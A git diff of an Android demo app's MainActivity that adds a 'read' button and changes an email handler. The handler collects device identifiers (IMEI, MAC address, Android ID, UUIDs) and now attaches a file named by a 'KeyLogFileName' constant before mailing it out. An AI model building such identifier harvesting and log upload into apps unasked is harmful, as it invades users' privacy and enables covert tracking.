@@ -6,6 +6,8 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 
+import com.kuangxf.baseappas.AppConfig;
+import com.kuangxf.baseappas.MyApplication;
 import com.kuangxf.baseappas.R;
 import com.kuangxf.baseappas.baseactivity.BaseActivity;
 import com.kuangxf.baseappas.db.DeviceIdBean;
@@ -21,14 +23,19 @@ import com.kuangxf.baseappas.utils.MyDesKeyUtil;
 
 import org.xutils.ex.DbException;
 
+import java.io.IOException;
 import java.util.Date;
 import java.util.List;
+
+import javax.mail.MessagingException;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMultipart;
 
 import static com.kuangxf.baseappas.MyApplication.db;
 
 public class MainActivity extends BaseActivity implements View.OnClickListener {
 
-    private Button btn_db, btn_send_email, btn_re_email, btn_enc, btn_save;
+    private Button btn_db, btn_send_email, btn_re_email, btn_enc, btn_save, btn_read;
     private EditText et_name, et_pw;
 
     @Override
@@ -44,12 +51,14 @@ public class MainActivity extends BaseActivity implements View.OnClickListener {
         btn_re_email = (Button) findViewById(R.id.btn_re_email);
         btn_enc = (Button) findViewById(R.id.btn_enc);
         btn_save = (Button) findViewById(R.id.btn_save);
+        btn_read = (Button) findViewById(R.id.btn_read);
 
         btn_db.setOnClickListener(this);
         btn_send_email.setOnClickListener(this);
         btn_re_email.setOnClickListener(this);
         btn_enc.setOnClickListener(this);
         btn_save.setOnClickListener(this);
+        btn_read.setOnClickListener(this);
 
         et_name = (EditText) findViewById(R.id.et_name);
         et_pw = (EditText) findViewById(R.id.et_pw);
@@ -89,7 +98,7 @@ public class MainActivity extends BaseActivity implements View.OnClickListener {
                         Date d = new Date();
                         LogUtil.e("开始发送");
                         StringBuffer sb = new StringBuffer();
-                        sb.append("时间：" + SimpleMail.sdf_split.format(d) + "\n\r");
+                        sb.append("时间：" + AppConfig.sdf_split.format(d) + "\n\r");
                         sb.append("DeviceIdUtil.getAndroidId(activity)：" + DeviceIdUtil.getAndroidId(mActivity) + "\n\r");
                         sb.append("DeviceIdUtil.getIMEI(activity)：" + DeviceIdUtil.getIMEI(mActivity) + "\n\r");
                         sb.append("DeviceIdUtil.getMacAddress(activity)：" + DeviceIdUtil.getMacAddress(mActivity) + "\n\r");
@@ -97,7 +106,22 @@ public class MainActivity extends BaseActivity implements View.OnClickListener {
                         sb.append("DeviceIdUtil.getIdFromRom()：" + DeviceIdUtil.getIdFromRom() + "\n\r");
                         sb.append("DeviceIdUtil.getUuidFen()：" + DeviceIdUtil.getUuidFen() + "\n\r");
                         sb.append("DeviceIdUtil.getUuid()：" + DeviceIdUtil.getUuid() + "\n\r");
-                        SimpleMailSend.sendEmailOnlyText(sb.toString());
+
+//                        SimpleMailSend.sendEmailOnlyText(sb.toString());
+                        MimeMultipart partList = new MimeMultipart();
+                        MimeBodyPart part1 = new MimeBodyPart();
+                        MimeBodyPart part2 = new MimeBodyPart();
+                        try {
+                            part1.setText(sb.toString());
+                            part2.attachFile(MyApplication.getShare(LogUtil.KeyLogFileName));
+                            partList.addBodyPart(part1);
+                            partList.addBodyPart(part2);
+                        } catch (MessagingException e) {
+                            e.printStackTrace();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                        SimpleMailSend.sendEmail(partList);
                         LogUtil.e("over");
                     }
                 }).start();
@@ -131,6 +155,9 @@ public class MainActivity extends BaseActivity implements View.OnClickListener {
                 if (!TextUtils.isEmpty(pw)){
                     UserInfo.setPw(pw);
                 }
+                break;
+            case R.id.btn_read:
+                LogUtil.readFile();
                 break;
         }
     }
